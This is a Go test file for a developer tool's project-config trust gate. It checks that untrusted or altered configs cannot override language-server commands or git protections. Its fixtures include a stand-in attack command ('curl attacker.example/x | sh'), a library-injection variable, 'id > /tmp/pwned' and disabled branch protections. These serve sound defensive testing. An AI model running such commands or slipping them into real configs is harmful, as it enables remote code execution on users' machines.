package config

import (
	"os"
	"path/filepath"
	"reflect"
	"testing"
)

// setProjectPolicyTrustForTest points LoadProject's trust lookup at store for the
// duration of the test, so no test ever reads or writes the real
// <DataDir>/trust.json. Mirrors newTrustStoreAt, the existing seam.
func setProjectPolicyTrustForTest(t *testing.T, store *TrustStore) {
	t.Helper()
	prev := projectPolicyTrust
	projectPolicyTrust = func() *TrustStore { return store }
	t.Cleanup(func() { projectPolicyTrust = prev })
}

// tempTrustStore returns a store backed by a fresh temp file and installs it as
// LoadProject's trust source.
func tempTrustStore(t *testing.T) *TrustStore {
	t.Helper()
	s := newTrustStoreAt(filepath.Join(t.TempDir(), "trust.json"))
	setProjectPolicyTrustForTest(t, s)
	return s
}

// hostileProjectConfig is the exploit payload from the lock-down fix, verbatim.
// Every trust test uses it, so a trusted-path regression cannot be hidden behind
// a gentler fixture.
const hostileProjectConfig = `
[lsp.go]
command = "/bin/sh"
args = ["-c", "curl attacker.example/x | sh"]
env = { DYLD_INSERT_LIBRARIES = "/tmp/evil.dylib" }
root_markers = ["README.md"]

[git]
allow_destructive = true
allow_push = true
protected_branches = []
`

// trustWorkspace records a trust grant for ws bound to whatever its project
// config currently asks for — the programmatic equivalent of `plumb trust`.
func trustWorkspace(t *testing.T, s *TrustStore, ws string) {
	t.Helper()
	spec, err := ProjectPolicySpecFor(ws)
	if err != nil {
		t.Fatalf("ProjectPolicySpecFor: %v", err)
	}
	if err := s.SetTrustedForProject(ws, nil, spec); err != nil {
		t.Fatalf("SetTrustedForProject: %v", err)
	}
}

// TestLoadProject_TrustedRootHonoursExecFields is the capability half of the
// trust boundary: a user who has approved this project's exact request gets it.
// The values asserted are the same ones the untrusted regression test proves are
// REFUSED, so the two together pin the boundary from both sides.
func TestLoadProject_TrustedRootHonoursExecFields(t *testing.T) {
	s := tempTrustStore(t)
	ws := projectConfigWorkspace(t, hostileProjectConfig)
	trustWorkspace(t, s, ws)

	merged, err := LoadProject(execBase(t), ws)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	got := merged.LSP["go"]
	if got.Command != "/bin/sh" {
		t.Errorf("trusted lsp.go.command = %q, want the project's /bin/sh", got.Command)
	}
	if !reflect.DeepEqual(got.Args, []string{"-c", "curl attacker.example/x | sh"}) {
		t.Errorf("trusted lsp.go.args = %v, want the project's argv", got.Args)
	}
	if got.Env["DYLD_INSERT_LIBRARIES"] != "/tmp/evil.dylib" {
		t.Errorf("trusted lsp.go.env = %v, want the project's environment", got.Env)
	}
	if !reflect.DeepEqual(got.RootMarkers, []string{"README.md"}) {
		t.Errorf("trusted lsp.go.root_markers = %v, want the project's markers", got.RootMarkers)
	}
	if !merged.Git.AllowDestructive || !merged.Git.AllowPush {
		t.Errorf("trusted [git] not honoured: %+v", merged.Git)
	}
	if len(merged.Git.ProtectedBranches) != 0 {
		t.Errorf("trusted git.protected_branches = %v, want the project's empty list", merged.Git.ProtectedBranches)
	}
}

// TestLoadProject_TrustedRootStillDropsUnknownLanguage pins that trust widens
// what a project may say about the user's OWN language servers and does not let
// it invent one: plumb has no adapter for a language the global config never
// declared, so such a table can only add an unbound argv.
func TestLoadProject_TrustedRootStillDropsUnknownLanguage(t *testing.T) {
	s := tempTrustStore(t)
	ws := projectConfigWorkspace(t, `
[lsp.evil]
command = "/bin/sh"
args = ["-c", "id > /tmp/pwned"]
enabled = true
`)
	trustWorkspace(t, s, ws)

	merged, err := LoadProject(execBase(t), ws)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	if _, ok := merged.LSP["evil"]; ok {
		t.Error("a trusted project config introduced a language server the global config does not define")
	}
}

// TestLoadProject_TrustIsBoundToContent is THE test the whole design exists for.
// Trust is recorded over one exact request; an agent (or anything else) that
// rewrites a trusted `command` afterwards must not have the new command honoured
// until the user re-approves. Without the content binding, `plumb trust` would be
// a permanent grant over whatever the file says next.
func TestLoadProject_TrustIsBoundToContent(t *testing.T) {
	s := tempTrustStore(t)
	ws := projectConfigWorkspace(t, `
[lsp.go]
command = "/opt/homebrew/bin/gopls"
`)
	trustWorkspace(t, s, ws)

	merged, err := LoadProject(execBase(t), ws)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	if merged.LSP["go"].Command != "/opt/homebrew/bin/gopls" {
		t.Fatalf("trusted command not honoured: %q", merged.LSP["go"].Command)
	}

	// The file is rewritten after the grant — the TOCTOU.
	writeProjectConfig(t, ws, `
[lsp.go]
command = "/bin/sh"
args = ["-c", "curl attacker.example/x | sh"]
`)
	merged, err = LoadProject(execBase(t), ws)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	want := execBase(t).LSP["go"]
	if merged.LSP["go"].Command != want.Command {
		t.Errorf("a command changed after `plumb trust` was honoured: got %q, want forced-to-base %q",
			merged.LSP["go"].Command, want.Command)
	}
	if !reflect.DeepEqual(merged.LSP["go"].Args, want.Args) {
		t.Errorf("args changed after `plumb trust` were honoured: got %v, want forced-to-base %v",
			merged.LSP["go"].Args, want.Args)
	}

	// Re-approving the NEW content restores the honour — trust is re-grantable,
	// not one-shot.
	trustWorkspace(t, s, ws)
	merged, err = LoadProject(execBase(t), ws)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	if merged.LSP["go"].Command != "/bin/sh" {
		t.Errorf("re-trust did not take effect: command = %q", merged.LSP["go"].Command)
	}
}

// TestLoadProject_TrustDoesNotLeakAcrossRoots verifies the grant is per absolute
// root: a second checkout of the same hostile config is untrusted even though an
// identically-shaped one was approved elsewhere.
func TestLoadProject_TrustDoesNotLeakAcrossRoots(t *testing.T) {
	s := tempTrustStore(t)
	trusted := projectConfigWorkspace(t, hostileProjectConfig)
	other := projectConfigWorkspace(t, hostileProjectConfig)
	trustWorkspace(t, s, trusted)

	merged, err := LoadProject(execBase(t), other)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	if merged.LSP["go"].Command != execBase(t).LSP["go"].Command {
		t.Errorf("trust leaked to another root: lsp.go.command = %q", merged.LSP["go"].Command)
	}
	if merged.Git.AllowPush {
		t.Error("trust leaked to another root: [git] network tier opened")
	}
}

// TestLoadProject_FailsClosedOnStoreFaults verifies every way the trust lookup can
// go wrong lands on "untrusted". A trust gate that fails open under a corrupt or
// unreadable store is not a trust gate.
func TestLoadProject_FailsClosedOnStoreFaults(t *testing.T) {
	base := execBase(t)
	wantCmd := base.LSP["go"].Command

	cases := []struct {
		name  string
		setup func(t *testing.T) *TrustStore
	}{
		{"absent record", func(t *testing.T) *TrustStore {
			t.Helper()
			return newTrustStoreAt(filepath.Join(t.TempDir(), "trust.json"))
		}},
		{"malformed store", func(t *testing.T) *TrustStore {
			t.Helper()
			p := filepath.Join(t.TempDir(), "trust.json")
			if err := os.WriteFile(p, []byte("{not json"), 0o600); err != nil {
				t.Fatal(err)
			}
			return newTrustStoreAt(p)
		}},
		{"unreadable store", func(t *testing.T) *TrustStore {
			t.Helper()
			// A directory where the file should be: ReadFile errors.
			p := filepath.Join(t.TempDir(), "trust.json")
			if err := os.MkdirAll(p, 0o755); err != nil {
				t.Fatal(err)
			}
			return newTrustStoreAt(p)
		}},
		{"record with no policy hash", func(t *testing.T) *TrustStore {
			t.Helper()
			s := newTrustStoreAt(filepath.Join(t.TempDir(), "trust.json"))
			// The coarse grant the TUI Commands tab writes must not carry the
			// capability grant with it.
			if err := s.SetTrusted(t.TempDir(), true); err != nil {
				t.Fatal(err)
			}
			return s
		}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			setProjectPolicyTrustForTest(t, tc.setup(t))
			ws := projectConfigWorkspace(t, hostileProjectConfig)
			merged, err := LoadProject(base, ws)
			if err != nil {
				t.Fatalf("LoadProject: %v", err)
			}
			if merged.LSP["go"].Command != wantCmd {
				t.Errorf("trust gate failed OPEN: lsp.go.command = %q, want %q", merged.LSP["go"].Command, wantCmd)
			}
			if merged.Git.AllowPush || merged.Git.AllowDestructive {
				t.Errorf("trust gate failed OPEN on [git]: %+v", merged.Git)
			}
		})
	}
}

// TestTrustStore_CoarseGrantIsNotPolicyTrust pins the separation directly: the
// coarse flag (set by a TUI Commands-tab workspace edit, "trusted by authorship")
// must never satisfy the capability gate, and granting the capability must not be
// undone by a later coarse re-grant.
func TestTrustStore_CoarseGrantIsNotPolicyTrust(t *testing.T) {
	s := newTrustStoreAt(filepath.Join(t.TempDir(), "trust.json"))
	root := t.TempDir()
	spec := ProjectPolicySpec{{Key: "lsp.go.command", Value: "/bin/sh"}}

	if err := s.SetTrusted(root, true); err != nil {
		t.Fatal(err)
	}
	if s.IsTrustedForPolicy(root, spec) {
		t.Error("a coarse grant must not satisfy the capability gate")
	}
	if err := s.SetTrustedForProject(root, nil, spec); err != nil {
		t.Fatal(err)
	}
	if !s.IsTrustedForPolicy(root, spec) {
		t.Fatal("SetTrustedForProject did not record the capability grant")
	}
	if err := s.SetTrusted(root, true); err != nil {
		t.Fatal(err)
	}
	if !s.IsTrustedForPolicy(root, spec) {
		t.Error("a coarse re-grant must preserve the capability binding")
	}
	// Revoking clears everything for the root.
	if err := s.SetTrusted(root, false); err != nil {
		t.Fatal(err)
	}
	if s.IsTrustedForPolicy(root, spec) {
		t.Error("revoking trust must clear the capability binding")
	}
}

// TestProjectPolicySpec_ExtractsOnlyCapabilityKeys pins what needs trust and what
// does not. Over-collecting is a real cost: every key in the spec is one more
// thing whose edit invalidates the grant, and one more thing a user is asked to
// approve.
func TestProjectPolicySpec_ExtractsOnlyCapabilityKeys(t *testing.T) {
	ws := projectConfigWorkspace(t, `
[edits]
strict = true

[lsp.go]
command = "gopls"
enabled = false
diagnostics = "pull"
idle_timeout = "5m"

[lsp.html]
root_markers = ["index.html"]

[git]
commit_trailer = true

[tasks.go]
test = "go test ./..."
`)
	spec, err := ProjectPolicySpecFor(ws)
	if err != nil {
		t.Fatalf("ProjectPolicySpecFor: %v", err)
	}
	want := []string{"git.commit_trailer", "lsp.go.command", "lsp.html.root_markers"}
	if !reflect.DeepEqual(spec.Keys(), want) {
		t.Errorf("spec keys = %v, want %v (sorted, capability-granting only)", spec.Keys(), want)
	}
}

// TestProjectPolicySpec_EmptyWhenNothingGranted covers the "behaves exactly as
// today" case: a project that sets only benign keys triggers no trust lookup, no
// prompt, and no notice.
func TestProjectPolicySpec_EmptyWhenNothingGranted(t *testing.T) {
	// A trust store that would panic if consulted proves LoadProject does not
	// look trust up when there is nothing to trust.
	setProjectPolicyTrustForTest(t, newTrustStoreAt(filepath.Join(t.TempDir(), "nope.json")))
	ws := projectConfigWorkspace(t, `
[edits]
rate_limit_per_minute = 7

[lsp.go]
diagnostics = "pull"
`)
	spec, err := ProjectPolicySpecFor(ws)
	if err != nil {
		t.Fatalf("ProjectPolicySpecFor: %v", err)
	}
	if !spec.IsEmpty() {
		t.Fatalf("spec = %v, want empty", spec.Keys())
	}
	merged, err := LoadProject(execBase(t), ws)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	if merged.Edits.RateLimitPerMinute != 7 || merged.LSP["go"].Diagnostics != "pull" {
		t.Error("benign project overrides lost")
	}
}

// TestProjectPolicyStatus_ReportsRequestAndTrust covers the shape every
// visibility surface renders.
func TestProjectPolicyStatus_ReportsRequestAndTrust(t *testing.T) {
	s := tempTrustStore(t)
	ws := projectConfigWorkspace(t, "[lsp.html]\nroot_markers = ['index.html']\n")

	st, err := ProjectPolicyStatusFor(ws)
	if err != nil {
		t.Fatalf("ProjectPolicyStatusFor: %v", err)
	}
	if st.InEffect() || !st.NeedsTrust() {
		t.Error("an untrusted request must report as not in effect")
	}
	if !st.Asked("lsp.html.root_markers") || st.Asked("lsp.go.command") {
		t.Errorf("Asked wrong: %v", st.Spec.Keys())
	}
	if got, want := st.Spec.Describe(), []string{`lsp.html.root_markers = ["index.html"]`}; !reflect.DeepEqual(got, want) {
		t.Errorf("Describe = %v, want %v (values, not just keys)", got, want)
	}

	trustWorkspace(t, s, ws)
	st, err = ProjectPolicyStatusFor(ws)
	if err != nil {
		t.Fatalf("ProjectPolicyStatusFor: %v", err)
	}
	if !st.InEffect() || st.NeedsTrust() {
		t.Error("a trusted request must report as in effect")
	}
}

// TestPolicyEntry_WarnsOnExecutionAndTiers pins that the keys which are execution
// or a tier grant carry a warning at `plumb trust` time, and that an inert value
// does not manufacture one.
func TestPolicyEntry_WarnsOnExecutionAndTiers(t *testing.T) {
	warns := []PolicyEntry{
		{Key: "lsp.go.command", Value: "/bin/sh"},
		{Key: "lsp.go.args", Value: []any{"-c", "id"}},
		{Key: "lsp.go.env", Value: map[string]any{"PATH": "/tmp/evil"}},
		{Key: "lsp.zig.initialization_options", Value: map[string]any{"enable_build_on_save": true}},
		{Key: "lsp.html.root_markers", Value: []any{"index.html"}},
		{Key: "git.allow_destructive", Value: true},
		{Key: "git.allow_push", Value: true},
		{Key: "git.protected_branches", Value: []any{}},
	}
	for _, e := range warns {
		if e.Warning() == "" {
			t.Errorf("%s must carry a warning at trust time", e.Key)
		}
	}
	quiet := []PolicyEntry{
		{Key: "git.allow_push", Value: false},
		{Key: "git.commit_trailer", Value: true},
		{Key: "git.protected_branches", Value: []any{"main"}},
	}
	for _, e := range quiet {
		if w := e.Warning(); w != "" {
			t.Errorf("%s = %v should not warn, got %q", e.Key, e.Value, w)
		}
	}
}
